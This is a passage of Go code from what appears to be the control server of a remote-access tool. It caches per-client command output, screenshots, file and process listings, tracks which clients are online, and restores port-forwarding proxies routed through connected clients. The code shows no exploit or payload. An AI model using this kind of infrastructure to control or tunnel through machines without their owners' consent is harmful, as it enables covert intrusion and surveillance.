// ClearSystemInfoResult removes stored system info result
func (s *Server) ClearSystemInfoResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.systemInfoResults, clientID)
}

// clearCachedClientData removes any cached result blobs for a client
func (s *Server) clearCachedClientData(clientID string) {
	s.resultsMu.Lock()
	delete(s.commandResults, clientID)
	delete(s.fileListResults, clientID)
	delete(s.driveListResults, clientID)
	delete(s.fileDataResults, clientID)
	delete(s.screenshotResults, clientID)
	delete(s.processListResults, clientID)
	delete(s.systemInfoResults, clientID)
	s.resultsMu.Unlock()
}

// monitorClientStatus monitors client status and updates database
func (s *Server) monitorClientStatus() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in monitorClientStatus: %v", r)
			log.Println("Restarting client status monitor...")
			time.Sleep(5 * time.Second)
			go s.monitorClientStatus() // Restart the monitor
		}
	}()

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		// Save all currently connected clients to database
		allClients := s.manager.GetAllClients()
		for _, client := range allClients {
			metadata := client.Metadata()
			if metadata != nil && s.store != nil {
				if err := s.store.SaveClient(metadata); err != nil {
					log.Printf("Error saving client %s: %v", client.ID(), err)
				}
			}
		}

		// Mark clients as offline if not seen recently (2 minutes)
		if s.store != nil {
			if err := s.store.MarkOffline(2 * time.Minute); err != nil {
				log.Printf("Error marking offline clients: %v", err)
			}
		}
	}
}

// loadSavedClients loads previously saved clients from database on startup
func (s *Server) loadSavedClients() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in loadSavedClients: %v", r)
		}
	}()

	if s.store == nil {
		log.Println("Client store not available, skipping load from database")
		return
	}

	log.Println("Loading saved clients from database...")
	clients, err := s.store.GetAllClients()
	if err != nil {
		log.Printf("Error loading saved clients: %v", err)
		return
	}

	log.Printf("Loaded %d clients from database", len(clients))
	for _, client := range clients {
		log.Printf("  - %s (%s) - %s - Last seen: %s",
			client.ID, client.Hostname, client.Status, client.LastSeen.Format(time.RFC3339))
	}
}

// loadSavedProxies loads previously saved proxies from database on startup
func (s *Server) loadSavedProxies() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in loadSavedProxies: %v", r)
		}
	}()

	if s.store == nil {
		log.Println("Store not available, skipping proxy load from database")
		return
	}

	log.Println("Loading saved proxies from database...")

	// Initialize proxy manager if not already done
	if s.proxyManager == nil {
		s.proxyManager = NewProxyManager(s.manager, s.store)
	}

	proxies, err := s.store.GetAllProxies()
	if err != nil {
		log.Printf("Error loading saved proxies: %v", err)
		return
	}

	if len(proxies) == 0 {
		log.Println("No saved proxies found in database")
		return
	}

	log.Printf("Found %d saved proxies in database, attempting to restore...", len(proxies))

	successCount := 0
	failCount := 0

	for _, proxy := range proxies {
		// Check if client is available
		client, exists := s.manager.GetClient(proxy.ClientID)
		if !exists {
			log.Printf("  ⚠️  Skipping proxy %s (client %s not currently connected)", proxy.ID, proxy.ClientID)
			failCount++
			continue
		}

		if client.Conn() == nil {
			log.Printf("  ⚠️  Skipping proxy %s (client %s WebSocket not ready)", proxy.ID, proxy.ClientID)
			failCount++
			continue
		}

		// Try to recreate the proxy
		conn, err := s.proxyManager.CreateProxyConnection(
			proxy.ClientID,
			proxy.RemoteHost,
			proxy.RemotePort,
			proxy.LocalPort,
			proxy.Protocol,
		)

		if err != nil {
			log.Printf("  ❌ Failed to restore proxy %s: %v", proxy.ID, err)
			failCount++
			continue
		}

		log.Printf("  ✅ Restored proxy: :%d -> %s:%d (client: %s, protocol: %s)",
			conn.LocalPort, conn.RemoteHost, conn.RemotePort, conn.ClientID, conn.Protocol)
		successCount++
	}

	log.Printf("Proxy restore complete: %d restored, %d skipped/failed", successCount, failCount)
	log.Printf("Note: Proxies will be auto-restored when their clients reconnect")
}

// UpdateClientMetadata implements messaging.ClientMetadataUpdater
func (s *Server) UpdateClientMetadata(clientID string, fn func(*protocol.ClientMetadata)) {
	// Ignore error - client may not exist yet, which is fine for heartbeat updates
	_ = s.manager.UpdateClientMetadata(clientID, fn)
}
